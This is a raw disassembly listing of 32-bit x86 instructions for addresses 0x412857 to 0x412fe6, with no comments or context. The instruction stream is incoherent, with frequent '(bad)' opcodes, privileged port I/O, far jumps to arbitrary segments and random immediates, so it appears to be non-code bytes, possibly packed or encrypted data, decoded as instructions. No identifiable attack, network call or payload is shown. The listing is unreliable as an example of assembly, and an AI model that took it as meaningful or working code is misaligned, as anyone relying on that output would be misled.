  412857:	scas   al,BYTE PTR es:[edi]
  412858:	push   0x2b
  41285a:	dec    ebx
  41285b:	and    eax,0x361d5c2
  412860:	ins    BYTE PTR es:[edi],dx
  412861:	push   ebx
  412862:	mov    edx,0x477fe316
  412867:	ffree  st(4)
  412869:	test   BYTE PTR [ebx-0x58],ch
  41286c:	in     eax,dx
  41286d:	aas    
  41286e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41286f:	mov    ch,0x21
  412871:	jp     0x412845
  412873:	je     0x4128bf
  412875:	int    0xb2
  412877:	or     al,0x1e
  412879:	test   al,0x60
  41287b:	popa   
  41287c:	mov    dl,0x6f
  41287e:	ss pop esp
  412880:	mov    edx,DWORD PTR cs:[ebp-0x5f]
  412884:	xor    ecx,DWORD PTR [edx-0x4f]
  412887:	lods   al,BYTE PTR ds:[esi]
  412888:	fstp   TBYTE PTR ds:0xba3ee61c
  41288e:	jle    0x41289f
  412890:	fbld   TBYTE PTR [edi*8-0x74c8ddf3]
  412897:	std    
  412898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412899:	lock pop es
  41289b:	clc    
  41289c:	stc    
  41289d:	gs in  al,0xff
  4128a0:	rcl    DWORD PTR [eax+0x27],0x18
  4128a4:	(bad)  
  4128a5:	rcr    BYTE PTR [ebx],cl
  4128a7:	cmp    al,0x3f
  4128a9:	mov    dl,0xd4
  4128ab:	and    al,0x7d
  4128ad:	xor    BYTE PTR [edi-0x71],ch
  4128b0:	mov    ecx,0xa86fbc7
  4128b5:	pop    ds
  4128b6:	bound  ebx,QWORD PTR [esi+ebp*1-0x3b9bf79d]
  4128bd:	xlat   BYTE PTR ds:[ebx]
  4128be:	rcr    DWORD PTR [ecx-0x41],0xd7
  4128c2:	repnz (bad) [ecx+0x38]
  4128c6:	push   eax
  4128c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128c8:	mov    eax,DWORD PTR [eax]
  4128ca:	and    ah,cl
  4128cc:	aaa    
  4128cd:	jge    0x412858
  4128cf:	pop    ebx
  4128d0:	mov    ch,0x59
  4128d2:	neg    ch
  4128d4:	aam    0x38
  4128d6:	and    ch,BYTE PTR [ebx]
  4128d8:	mov    WORD PTR [ecx],es
  4128da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128db:	xchg   ebx,eax
  4128dc:	call   0xd3c99327
  4128e1:	sbb    ebx,DWORD PTR [edi]
  4128e3:	add    DWORD PTR [esi-0x32cea06f],esp
  4128e9:	test   eax,0x232a5998
  4128ee:	pop    ebp
  4128ef:	mov    ds:0xfe73617a,eax
  4128f4:	scas   eax,DWORD PTR es:[edi]
  4128f5:	call   FWORD PTR [ebx+ebx*8-0x295b7ec1]
  4128fc:	lods   eax,DWORD PTR ds:[esi]
  4128fd:	add    eax,0xb75dbd2b
  412902:	mov    DWORD PTR [eax-0x34f0be9a],esi
  412908:	and    eax,0x39d28c2f
  41290d:	dec    edi
  41290e:	xor    al,0x3b
  412910:	or     DWORD PTR [edx+0x2a],edi
  412913:	pop    edx
  412914:	pop    es
  412915:	(bad)  
  412916:	(bad)
  41291a:	push   esp
  41291b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291c:	xchg   ebp,eax
  41291d:	xchg   ah,ah
  41291f:	sub    eax,0x44ea2aa0
  412924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412925:	or     DWORD PTR [esi+0x43],edi
  412928:	mov    DWORD PTR [edx-0x30],edi
  41292b:	ror    BYTE PTR [esi-0x39],0xdf
  41292f:	ss dec edx
  412931:	or     al,0x89
  412933:	call   0x6bf9:0xb8bee882
  41293a:	adc    ch,BYTE PTR ds:0x9d51f4c9
  412940:	and    edi,ecx
  412942:	arpl   WORD PTR [esi-0x34],sp
  412945:	xchg   dl,al
  412947:	dec    edi
  412948:	std    
  412949:	outs   dx,BYTE PTR ds:[esi]
  41294a:	lahf   
  41294b:	jnp    0x4128da
  41294d:	or     BYTE PTR [esi],0xbc
  412950:	stos   DWORD PTR es:[edi],eax
  412951:	inc    eax
  412952:	sub    cl,BYTE PTR [edi]
  412954:	mov    al,0x0
  412956:	cdq    
  412957:	imul   esi,DWORD PTR [edi],0xffffffe3
  41295a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41295b:	test   eax,0xdceb11db
  412960:	arpl   di,bx
  412962:	jmp    0x41291a
  412964:	jae    0x412920
  412966:	loope  0x41294a
  412968:	sbb    eax,0x9b64db29
  41296d:	add    al,0xdd
  41296f:	xchg   ebp,eax
  412970:	ffreep st(5)
  412972:	cwde   
  412973:	push   edx
  412974:	adc    BYTE PTR [edi-0x1bcc6768],dl
  41297a:	cmp    edx,0xbd2e0e78
  412980:	into   
  412981:	test   DWORD PTR [edx],eax
  412983:	js     0x4129fc
  412985:	loope  0x412947
  412987:	loopne 0x41296a
  412989:	and    edx,DWORD PTR [eax-0x7d]
  41298c:	push   es
  41298d:	mov    esp,0x35aafdc3
  412992:	sahf   
  412993:	mov    al,0xdd
  412995:	mov    ebx,0xe1eff136
  41299a:	sub    edx,DWORD PTR [eax-0x679b878b]
  4129a0:	out    0x2e,eax
  4129a2:	lahf   
  4129a3:	test   al,0xa3
  4129a5:	cld    
  4129a6:	repnz or BYTE PTR [edi],ah
  4129a9:	jb     0x4129af
  4129ab:	pop    esi
  4129ac:	fiadd  DWORD PTR [edx+0x35]
  4129af:	mov    ebx,0x491056f5
  4129b4:	outs   dx,DWORD PTR ds:[esi]
  4129b5:	xchg   esi,eax
  4129b6:	sbb    al,0x7c
  4129b8:	pop    ss
  4129b9:	pop    ebx
  4129ba:	mov    ebp,DWORD PTR [ebp+0x656b7504]
  4129c0:	push   ax
  4129c2:	call   0xb754460a
  4129c7:	sbb    DWORD PTR [ebp+0x5e],eax
  4129ca:	jno    0x412a0c
  4129cc:	pusha  
  4129cd:	sbb    dl,BYTE PTR [esp+edx*1-0x4df05396]
  4129d4:	jbe    0x4129b2
  4129d6:	xchg   DWORD PTR [ebx-0x6f],ecx
  4129d9:	sahf   
  4129da:	test   esi,edi
  4129dc:	and    al,0x50
  4129de:	xchg   edx,eax
  4129df:	adc    eax,0x709a02ce
  4129e4:	pop    esp
  4129e5:	(bad)  
  4129e6:	pop    esp
  4129e7:	js     0x41299c
  4129e9:	inc    edx
  4129ea:	sti    
  4129eb:	cmc    
  4129ec:	pop    ds
  4129ed:	mov    eax,ds:0xd01cd849
  4129f2:	stos   BYTE PTR es:[edi],al
  4129f3:	dec    eax
  4129f4:	or     DWORD PTR [edx],edi
  4129f6:	idiv   BYTE PTR [ecx]
  4129f8:	iret   
  4129f9:	sbb    al,0x30
  4129fb:	push   ebp
  4129fc:	retf   
  4129fd:	lods   al,BYTE PTR ds:[esi]
  4129fe:	stc    
  4129ff:	fnstsw WORD PTR [ebp+0x340933b1]
  412a05:	adc    BYTE PTR [eax],ch
  412a07:	(bad)  
  412a08:	scas   al,BYTE PTR es:[edi]
  412a09:	out    0xc9,al
  412a0b:	jge    0x412994
  412a0d:	cld    
  412a0e:	retf   0x65e3
  412a11:	vpmacswd ymm9,ymm1,ymm6,ymm4
  412a17:	imul   BYTE PTR [edi*4+0x5c4d10e]
  412a1e:	adc    DWORD PTR [ecx+0x15],0xc119d8a6
  412a25:	cmp    al,0x14
  412a27:	das    
  412a28:	push   0x65b9eddf
  412a2d:	jns    0x412aa7
  412a2f:	stos   DWORD PTR es:[edi],eax
  412a30:	xchg   ecx,eax
  412a31:	jl     0x4129ea
  412a33:	ins    BYTE PTR es:[edi],dx
  412a34:	jno    0x412a06
  412a36:	fcmovb st,st(4)
  412a38:	shl    BYTE PTR [esp+eiz*8+0x3c],0xad
  412a3d:	mov    eax,ds:0x8f43e6e4
  412a42:	fs inc eax
  412a44:	xchg   edi,eax
  412a45:	test   eax,0xecd0a38a
  412a4a:	js     0x412a13
  412a4c:	out    0x49,eax
  412a4e:	fisubr DWORD PTR [eax+0x5b]
  412a51:	fsubr  st(1),st
  412a53:	out    dx,al
  412a54:	out    0x6,al
  412a56:	dec    ebx
  412a57:	daa    
  412a58:	clc    
  412a59:	pop    ebp
  412a5a:	enter  0xb482,0x99
  412a5e:	adc    al,0xb6
  412a60:	out    dx,eax
  412a61:	in     eax,0x3c
  412a63:	pop    ecx
  412a64:	adc    al,0x7f
  412a66:	retf   
  412a67:	sub    al,0x7
  412a69:	cmp    al,0x4a
  412a6b:	jno    0x412ae5
  412a6d:	cs iret 
  412a6f:	pop    eax
  412a70:	jno    0x412a5e
  412a72:	add    BYTE PTR [ecx+0xc],dl
  412a75:	test   al,ch
  412a77:	je     0x412a50
  412a79:	inc    edx
  412a7a:	jmp    0xfa14fbcf
  412a7f:	sub    al,0xbe
  412a81:	jg     0x412a2c
  412a83:	shl    al,1
  412a85:	sub    DWORD PTR [edx],esi
  412a87:	call   0x1ec753c6
  412a8c:	pop    ecx
  412a8d:	pop    ecx
  412a8e:	jbe    0x412aec
  412a90:	xchg   edi,eax
  412a91:	les    esi,FWORD PTR ds:0x83bf988
  412a97:	push   edx
  412a98:	test   al,0xe8
  412a9a:	and    eax,0x5b82b833
  412a9f:	fcom   DWORD PTR [eax+0x41]
  412aa2:	aad    0x37
  412aa4:	es pop ebx
  412aa6:	retf   
  412aa7:	mov    cl,0x27
  412aa9:	int    0xe5
  412aab:	sbb    esp,0xdb51decb
  412ab1:	xchg   DWORD PTR [ecx+0x21],esp
  412ab4:	retf   0x7c9f
  412ab7:	out    0xe0,eax
  412ab9:	into   
  412aba:	in     al,dx
  412abb:	mov    esp,0xccfbe124
  412ac0:	repz out dx,al
  412ac2:	fst    QWORD PTR [ebx]
  412ac4:	jle    0x412aab
  412ac6:	mov    bh,0x87
  412ac8:	arpl   WORD PTR [edx-0x1e15ae34],ax
  412ace:	push   edi
  412acf:	inc    esp
  412ad0:	(bad)  
  412ad1:	scas   eax,DWORD PTR es:[edi]
  412ad2:	jg     0x412a6d
  412ad4:	sub    al,0xdf
  412ad6:	add    eax,ecx
  412ad8:	xor    DWORD PTR [ebp-0x61b6b5f3],0xf73b7476
  412ae2:	test   eax,0x26de5fd2
  412ae7:	(bad)  
  412ae8:	dec    eax
  412ae9:	mov    al,ds:0x9c2ab074
  412aee:	daa    
  412aef:	mov    ds:0xcccbda21,eax
  412af4:	pop    edi
  412af5:	sub    BYTE PTR [eax+ecx*1-0x68eeaff4],cl
  412afc:	jp     0x412b71
  412afe:	mov    esi,DWORD PTR [ebx]
  412b00:	enter  0x5feb,0xd2
  412b04:	in     al,dx
  412b05:	mov    esp,DWORD PTR [eax-0x9]
  412b08:	xchg   BYTE PTR [ebp+0x775e6e65],bh
  412b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b0f:	pop    esi
  412b10:	xchg   BYTE PTR [edx],ch
  412b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b13:	add    al,0x10
  412b15:	cmp    eax,ebp
  412b17:	xchg   edx,eax
  412b18:	xchg   DWORD PTR [esi-0x61f84550],esp
  412b1e:	icebp  
  412b1f:	jns    0x412b3a
  412b21:	cld    
  412b22:	and    al,0xb4
  412b24:	adc    ch,BYTE PTR [ebx]
  412b26:	add    BYTE PTR [ebx+edx*4+0x7f7c03b9],dh
  412b2d:	lds    esp,FWORD PTR [eax+edx*2-0x38]
  412b31:	mov    ah,0xdf
  412b33:	sbb    eax,0x60719b26
  412b38:	data16 mov dl,0xd0
  412b3b:	loop   0x412b7e
  412b3d:	or     edi,DWORD PTR [edi+edi*8+0x4f]
  412b41:	mov    bh,0xf4
  412b43:	add    esp,DWORD PTR [esi]
  412b45:	dec    esi
  412b46:	aaa    
  412b47:	dec    eax
  412b48:	add    edi,ebx
  412b4a:	inc    ebx
  412b4b:	ret    
  412b4c:	sbb    BYTE PTR [esi-0x22],dh
  412b4f:	sbb    BYTE PTR [eax],bl
  412b51:	in     al,dx
  412b52:	push   esp
  412b53:	add    al,0xfe
  412b55:	sub    esi,DWORD PTR [ebx+0x2a0a416b]
  412b5b:	push   edi
  412b5c:	adc    DWORD PTR [edi+edi*8-0x10],esi
  412b60:	add    al,0x5c
  412b62:	mov    edi,0xb05ff40d
  412b67:	jae    0x412b92
  412b69:	and    eax,0x93b8834c
  412b6e:	mov    eax,ds:0x90ea5d8a
  412b73:	repz cmp ah,al
  412b76:	data16 and al,0x33
  412b79:	mov    ebp,0x7bffe038
  412b7e:	dec    esi
  412b7f:	dec    esp
  412b80:	add    dl,ch
  412b82:	out    dx,al
  412b83:	sbb    eax,ebp
  412b85:	lods   al,BYTE PTR ds:[esi]
  412b86:	mov    eax,edi
  412b88:	xchg   edi,eax
  412b89:	call   FWORD PTR [eax-0x1215cd87]
  412b8f:	pusha  
  412b90:	or     BYTE PTR [ebp-0xc],cl
  412b93:	in     eax,0x1c
  412b95:	fmul   DWORD PTR ds:[esi]
  412b98:	test   eax,0xc87edea2
  412b9d:	sbb    al,0x6
  412b9f:	mov    dl,0xf0
  412ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba2:	aam    0xf3
  412ba4:	adc    BYTE PTR [edx-0x73730737],0x9e
  412bab:	stc    
  412bac:	adc    al,0x77
  412bae:	sti    
  412baf:	arpl   WORD PTR [edx+0xa],bx
  412bb2:	(bad)  
  412bb3:	jl     0x412bd5
  412bb5:	aad    0xcf
  412bb7:	jbe    0x412b7a
  412bb9:	outs   dx,DWORD PTR ds:[esi]
  412bba:	jl     0x412bbf
  412bbc:	call   0x5c1a328d
  412bc1:	inc    ecx
  412bc2:	mov    ds:0x1d925917,al
  412bc7:	fwait
  412bc8:	ret    0x3822
  412bcb:	adc    al,0x24
  412bcd:	(bad)  
  412bce:	lea    edi,[edi]
  412bd0:	js     0x412be0
  412bd2:	mov    bh,0xc8
  412bd4:	push   ds
  412bd5:	int3   
  412bd6:	or     BYTE PTR [ecx+0x10],ah
  412bd9:	inc    edi
  412bda:	cmp    BYTE PTR [ebx+0x360fe92d],dh
  412be0:	mov    DWORD PTR fs:[edx+0x2e],edi
  412be4:	addr16 mov cl,0x7e
  412be7:	stc    
  412be8:	jp     0x412c13
  412bea:	icebp  
  412beb:	fdiv   DWORD PTR [edx+0x5631e0a0]
  412bf1:	mov    DWORD PTR [edi],edx
  412bf3:	in     eax,dx
  412bf4:	(bad)  
  412bf5:	jnp    0x412be0
  412bf7:	jbe    0x412c3c
  412bf9:	xchg   DWORD PTR [edx+0x1],edx
  412bfc:	mov    WORD PTR ds:0x6304e4cd,fs
  412c02:	aaa    
  412c03:	imul   esi,ebx,0x9555c000
  412c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c0a:	sub    BYTE PTR [ebx-0xa4baed4],0xf9
  412c11:	sar    BYTE PTR [esi+0x56],0xda
  412c15:	pop    edx
  412c16:	out    dx,eax
  412c17:	sbb    eax,0x7c1c6564
  412c1c:	in     al,dx
  412c1d:	in     al,0x21
  412c1f:	mov    dh,0x39
  412c21:	push   ebx
  412c22:	icebp  
  412c23:	das    
  412c24:	or     edx,ecx
  412c26:	dec    edi
  412c27:	dec    esi
  412c28:	pop    ebp
  412c29:	icebp  
  412c2a:	inc    edi
  412c2b:	xor    BYTE PTR es:[eax+ecx*8-0x3ae92195],cl
  412c33:	adc    BYTE PTR [edx],bl
  412c35:	stc    
  412c36:	pop    ebp
  412c37:	inc    edx
  412c38:	mov    ebx,0xca925a5f
  412c3d:	imul   eax,DWORD PTR [ecx],0xffffffc6
  412c40:	daa    
  412c41:	mov    DWORD PTR [edi-0x45],ebp
  412c44:	push   ebx
  412c45:	sti    
  412c46:	fistp  QWORD PTR [ebp-0x77]
  412c49:	icebp  
  412c4a:	dec    esi
  412c4b:	imul   ebp,DWORD PTR [eax+ecx*8-0x58],0xffffffc4
  412c50:	out    0x88,al
  412c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c53:	shr    ebx,0x1
  412c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c57:	hlt    
  412c58:	test   al,bl
  412c5a:	es inc edi
  412c5c:	popa   
  412c5d:	dec    edx
  412c5e:	push   es
  412c5f:	xchg   DWORD PTR [edx+0x42cba4b0],edi
  412c65:	test   BYTE PTR [edi+0x3004d79d],bh
  412c6b:	cmp    DWORD PTR [edi],0xa4f2a081
  412c71:	inc    ecx
  412c72:	mov    edx,0xd5c70ab3
  412c77:	imul   esi,DWORD PTR [ebx-0x52c1229c],0x71
  412c7e:	ret    0x67cf
  412c81:	sub    DWORD PTR [edi-0x67917a3b],ebx
  412c87:	sbb    cl,cl
  412c89:	test   eax,0x4ab87ea9
  412c8e:	mov    BYTE PTR [edi-0x15],dl
  412c91:	mov    ebx,0x4cf73e
  412c96:	dec    ebp
  412c97:	cmp    eax,0x41adb8d1
  412c9c:	(bad)  
  412c9d:	aaa    
  412c9e:	jmp    0x39b7:0xd8a530b8
  412ca5:	push   es
  412ca6:	xchg   ebx,eax
  412ca7:	fisttp WORD PTR [esi]
  412ca9:	jle    0x412cc4
  412cab:	out    dx,al
  412cac:	lds    ecx,FWORD PTR [edx+0x63907cb7]
  412cb2:	retf   0xa53b
  412cb5:	ins    DWORD PTR es:[edi],dx
  412cb6:	xchg   esp,eax
  412cb7:	ret    0xc621
  412cba:	jno    0x412c6a
  412cbc:	push   esp
  412cbd:	jo     0x412d0d
  412cbf:	jne    0x412d23
  412cc1:	call   0xa45a:0x7fccb395
  412cc8:	mov    al,0xa1
  412cca:	or     dl,BYTE PTR [edx]
  412ccc:	shl    eax,cl
  412cce:	mov    edx,0x9f1ba0fa
  412cd3:	and    al,0x28
  412cd5:	and    bh,BYTE PTR [edx]
  412cd7:	sub    DWORD PTR [eax+ecx*1],ebp
  412cda:	xchg   ebx,eax
  412cdb:	mov    cl,0x34
  412cdd:	sbb    DWORD PTR [eax],0x65a4d0a2
  412ce3:	std    
  412ce4:	repnz popf 
  412ce6:	sbb    al,0xe2
  412ce8:	cmp    dl,ah
  412cea:	mov    dh,BYTE PTR [edx-0x462360ee]
  412cf0:	outs   dx,DWORD PTR ds:[esi]
  412cf1:	repz cwde 
  412cf3:	cmp    ebx,DWORD PTR [edi]
  412cf5:	addr16 push ecx
  412cf7:	mov    ebp,ebx
  412cf9:	dec    ebp
  412cfa:	pop    ebx
  412cfb:	scas   al,BYTE PTR es:[edi]
  412cfc:	xchg   edx,eax
  412cfd:	mov    ds:0xdc04764,al
  412d02:	mov    bh,0xd9
  412d04:	or     DWORD PTR [ebx-0x614c46d6],ebp
  412d0a:	sub    BYTE PTR [edi],bl
  412d0c:	js     0x412cde
  412d0e:	cmp    bl,cl
  412d10:	sub    edx,ecx
  412d12:	cmp    eax,0x76b411a0
  412d17:	fwait
  412d18:	and    eax,0xd1f07e6c
  412d1d:	or     esi,edi
  412d1f:	jp     0x412cb3
  412d21:	retf   0x661b
  412d24:	fdivp  st(5),st
  412d26:	jo     0x412cc6
  412d28:	(bad)  
  412d29:	out    0x3b,eax
  412d2b:	aaa    
  412d2c:	call   0x3aaf:0x2c2ff879
  412d33:	loop   0x412cb7
  412d35:	shl    DWORD PTR [ebp-0x3f],1
  412d38:	xchg   esp,eax
  412d39:	scas   al,BYTE PTR es:[edi]
  412d3a:	xchg   edx,eax
  412d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d3c:	out    0xe6,al
  412d3e:	leave  
  412d3f:	scas   eax,DWORD PTR es:[edi]
  412d40:	push   ebp
  412d41:	imul   esi,DWORD PTR [edi-0x53677c1e],0xeb2d5684
  412d4b:	fdiv   QWORD PTR [esi-0x2b]
  412d4e:	mov    dl,0x57
  412d50:	jb     0x412d2d
  412d52:	sub    ebp,DWORD PTR [esi+0x19]
  412d55:	push   esp
  412d56:	test   DWORD PTR [eax],eax
  412d58:	fwait
  412d59:	int3   
  412d5a:	jmp    0x1c4:0x7aed473e
  412d61:	cmp    DWORD PTR [esp+edi*1],0xffffffe5
  412d65:	clc    
  412d66:	cs pop ebp
  412d68:	xchg   esi,eax
  412d69:	fcom   DWORD PTR [edx]
  412d6b:	test   DWORD PTR [edx+0x31d0e6ee],0xf36c150
  412d75:	push   ss
  412d76:	sub    BYTE PTR [eax-0x7fb0d9b8],0x8a
  412d7d:	or     al,0xd
  412d7f:	sub    DWORD PTR [ebp+0x3ea01828],edx
  412d85:	mov    esi,ebx
  412d87:	inc    ebp
  412d88:	xor    DWORD PTR [edi],0x21
  412d8b:	dec    esp
  412d8c:	xlat   BYTE PTR ds:[ebx]
  412d8d:	retf   0x2cb6
  412d90:	xor    al,BYTE PTR [edi]
  412d92:	test   BYTE PTR [eax+0x27],al
  412d95:	out    0x45,eax
  412d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d98:	mov    ?,ebp
  412d9a:	push   ss
  412d9b:	das    
  412d9c:	aaa    
  412d9d:	fs jecxz 0x412dc6
  412da0:	adc    BYTE PTR [ecx-0x75],dl
  412da3:	outs   dx,DWORD PTR ds:[esi]
  412da4:	adc    esp,DWORD PTR [ebx+0x66e01649]
  412daa:	push   edi
  412dab:	pop    edi
  412dac:	jmp    0x412df4
  412dae:	(bad)  
  412daf:	mov    ds:0xf1d0486e,eax
  412db4:	pop    esi
  412db5:	(bad)  
  412db6:	out    dx,eax
  412db7:	xchg   esp,eax
  412db8:	xor    dh,ch
  412dba:	(bad)  
  412dbb:	pushf  
  412dbc:	std    
  412dbd:	icebp  
  412dbe:	loope  0x412d80
  412dc0:	sub    edi,DWORD PTR [ebx]
  412dc2:	test   al,0xd8
  412dc4:	lea    edi,[eax-0x52]
  412dc7:	push   ss
  412dc8:	test   esp,edx
  412dca:	scas   eax,DWORD PTR es:[edi]
  412dcb:	sub    al,0xb7
  412dcd:	idiv   DWORD PTR [eax]
  412dcf:	in     al,0x6e
  412dd1:	xchg   ebx,eax
  412dd2:	sahf   
  412dd3:	adc    ebp,DWORD PTR [ebx-0x327dd770]
  412dd9:	jne    0x412e00
  412ddb:	mov    bh,0x42
  412ddd:	shr    DWORD PTR [esi-0x420c792a],1
  412de3:	scas   al,BYTE PTR es:[di]
  412de5:	xchg   DWORD PTR [edx-0x26],edi
  412de8:	mov    BYTE PTR [eax+0x1d],0xb8
  412dec:	lea    esp,[edx]
  412dee:	xchg   ebx,eax
  412def:	rcl    BYTE PTR [eax-0x14],0x57
  412df3:	xchg   esi,eax
  412df4:	dec    ebp
  412df5:	enter  0xce46,0x1d
  412df9:	dec    DWORD PTR [ebx+0x8]
  412dfc:	and    BYTE PTR [esi+0x8a7873e],bl
  412e02:	push   edi
  412e03:	lea    edx,[edi+esi*2+0x5cea3ec2]
  412e0a:	sbb    eax,DWORD PTR [esi+ebp*2]
  412e0d:	sbb    eax,0x5b304e3f
  412e12:	retf   
  412e13:	xchg   ecx,eax
  412e14:	sti    
  412e15:	dec    esi
  412e16:	(bad)  
  412e17:	(bad)  
  412e18:	xor    DWORD PTR [ebx+0x21b684dc],esi
  412e1e:	clc    
  412e1f:	xchg   ebx,eax
  412e20:	cli    
  412e21:	push   edi
  412e22:	pop    ecx
  412e23:	and    DWORD PTR [ebx+0x57],edx
  412e26:	stos   BYTE PTR es:[edi],al
  412e27:	mov    esi,DWORD PTR [edi-0x79]
  412e2a:	inc    esp
  412e2b:	add    DWORD PTR [eax],ebx
  412e2d:	loop   0x412e1b
  412e2f:	test   BYTE PTR [ecx+0x4f6cb22],dh
  412e35:	pushf  
  412e36:	jg     0x412de7
  412e38:	test   eax,0xdaf908b9
  412e3d:	mov    eax,0xc9cb9200
  412e42:	loope  0x412e70
  412e44:	adc    ebx,DWORD PTR [esi-0x16]
  412e47:	test   dh,0x44
  412e4a:	js     0x412e95
  412e4c:	adc    DWORD PTR [esi-0x25],0xffffff88
  412e50:	push   ebx
  412e51:	mov    dl,0x3e
  412e53:	out    0xa3,al
  412e55:	outs   dx,DWORD PTR ds:[esi]
  412e56:	shl    DWORD PTR [eax+0x6c9c64a9],cl
  412e5c:	add    DWORD PTR [edx-0x6b],esi
  412e5f:	pop    esp
  412e60:	mov    cs,WORD PTR [esi]
  412e62:	fs popa 
  412e64:	push   0x6bb827b3
  412e69:	push   edi
  412e6a:	clc    
  412e6b:	xchg   esp,eax
  412e6c:	sub    eax,0x13d6295
  412e71:	mov    al,bl
  412e73:	or     BYTE PTR [ecx-0x7c460ddc],ah
  412e79:	jp     0x412e40
  412e7b:	lods   al,BYTE PTR ds:[esi]
  412e7c:	sbb    DWORD PTR [esi+0x180b93b2],eax
  412e82:	and    eax,0x3962a3f
  412e87:	xchg   bx,ax
  412e89:	jl     0x412e58
  412e8b:	dec    ebp
  412e8c:	and    ebp,DWORD PTR [eax]
  412e8e:	cmc    
  412e8f:	cdq    
  412e90:	dec    ebx
  412e91:	lea    ebx,[esi-0x200049]
  412e97:	jle    0x412e34
  412e99:	addr16 or dh,0xe0
  412e9d:	sahf   
  412e9e:	rol    DWORD PTR [eax+0x39],0x64
  412ea2:	arpl   dx,bx
  412ea4:	aaa    
  412ea5:	push   ebp
  412ea6:	clc    
  412ea7:	cmp    eax,0x12c06c08
  412eac:	xchg   ebx,eax
  412ead:	push   ebp
  412eae:	or     ebx,DWORD PTR [ebx+0x489b209f]
  412eb4:	sbb    al,0xa3
  412eb6:	cmp    DWORD PTR [ecx+0x320a31b7],esi
  412ebc:	pop    ebx
  412ebd:	out    0x70,eax
  412ebf:	mov    ecx,0xcdd0ecfe
  412ec4:	cmp    eax,0xa433294a
  412ec9:	retf   0x1bb0
  412ecc:	sti    
  412ecd:	xchg   ebx,eax
  412ece:	std    
  412ecf:	pop    ebp
  412ed0:	(bad)  
  412ed1:	imul   DWORD PTR [edi]
  412ed3:	sbb    eax,0xb5b57311
  412ed8:	dec    ebp
  412ed9:	mov    edx,0x7f027ecc
  412ede:	(bad)  
  412edf:	xchg   ebp,eax
  412ee0:	sub    al,0x66
  412ee2:	popf   
  412ee3:	std    
  412ee4:	mov    edi,0xfa6a6c5e
  412ee9:	cmp    al,0x66
  412eeb:	jge    0x412ed2
  412eed:	push   es
  412eee:	cli    
  412eef:	sub    bh,al
  412ef1:	adc    eax,ecx
  412ef3:	out    0xb2,eax
  412ef5:	cmp    BYTE PTR [edi],0x6c
  412ef8:	pusha  
  412ef9:	mov    edi,0x88c0625e
  412efe:	pushf  
  412eff:	int    0xf6
  412f01:	rol    DWORD PTR [edi],1
  412f03:	add    al,0xe2
  412f05:	mov    ebp,0xbad90245
  412f0a:	or     al,0xf9
  412f0c:	mov    dl,0xa2
  412f0e:	test   eax,0x48f678df
  412f13:	js     0x412ed9
  412f15:	dec    eax
  412f16:	jmp    0x87ddb7f9
  412f1b:	aad    0xfe
  412f1d:	ret    
  412f1e:	ja     0x412ec8
  412f20:	shl    BYTE PTR [edi-0x2a7464d],1
  412f26:	mov    ds:0xc28fd578,eax
  412f2b:	xchg   BYTE PTR [esi],ah
  412f2d:	xor    ch,BYTE PTR [edi+0x29]
  412f30:	push   eax
  412f31:	and    bh,BYTE PTR [esi-0x54c37f]
  412f37:	mov    ecx,0x1a56f7d7
  412f3c:	jmp    0x6a67:0x899d46e2
  412f43:	inc    edx
  412f44:	fist   WORD PTR [ecx-0x43]
  412f47:	fild   QWORD PTR [ebx+0x61]
  412f4a:	mov    edx,0x35382bd0
  412f4f:	xchg   ecx,eax
  412f50:	jne    0x412ef2
  412f52:	add    DWORD PTR es:[ecx+edi*2-0x40],edx
  412f57:	jmp    0xe2f9:0x527d6ba2
  412f5e:	push   esp
  412f5f:	adc    eax,DWORD PTR [ebx]
  412f61:	and    al,0x2a
  412f63:	call   0xe671:0x88542ab6
  412f6a:	dec    esp
  412f6b:	push   ss
  412f6c:	xor    eax,0xaf38ded5
  412f71:	mov    dl,0xec
  412f73:	sub    al,0x85
  412f75:	sar    BYTE PTR [ebx],1
  412f77:	jnp    0x412f5a
  412f79:	push   ebp
  412f7a:	jle    0x412fc0
  412f7c:	and    BYTE PTR [ecx+0x54],cl
  412f7f:	adc    esi,DWORD PTR [ebp-0x6d4880d4]
  412f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f86:	pop    ds
  412f87:	jo     0x412f09
  412f89:	pushf  
  412f8a:	jp     0x412fad
  412f8c:	aad    0x9c
  412f8e:	mov    bl,0xa6
  412f90:	mov    WORD PTR [ecx],cs
  412f92:	mov    ds,WORD PTR [esi+ebx*2-0x8fc1399]
  412f99:	and    ah,bh
  412f9b:	mov    edx,0xeb7f4b5f
  412fa0:	jge    0x412f78
  412fa2:	fidivr DWORD PTR gs:[edi-0x2bfe6979]
  412fa9:	mov    dh,0x20
  412fab:	sbb    esp,ebx
  412fad:	(bad)  
  412fae:	xor    DWORD PTR [edi+eiz*4+0x33422810],ebp
  412fb5:	cwde   
  412fb6:	xlat   BYTE PTR ds:[ebx]
  412fb7:	xchg   ebp,eax
  412fb8:	out    0x19,al
  412fba:	mov    eax,0x5715d7a5
  412fbf:	pop    ebx
  412fc0:	arpl   ax,si
  412fc2:	jns    0x413008
  412fc4:	mov    edx,0x9eaa95af
  412fc9:	out    0x89,al
  412fcb:	xchg   BYTE PTR [ecx-0x72],bl
  412fce:	and    eax,0x75d3eb27
  412fd3:	xchg   edx,eax
  412fd4:	inc    ecx
  412fd5:	ror    BYTE PTR [ebx+0x19],cl
  412fd8:	das    
  412fd9:	or     dh,dl
  412fdb:	sub    al,0xac
  412fdd:	outs   dx,DWORD PTR ds:[esi]
  412fde:	fsubrp st(5),st
  412fe0:	dec    esi
  412fe1:	or     BYTE PTR [edi],bl
  412fe3:	pop    esi
  412fe4:	push   ebp
  412fe5:	in     al,dx
  412fe6:	stos   BYTE PTR es:[edi],al
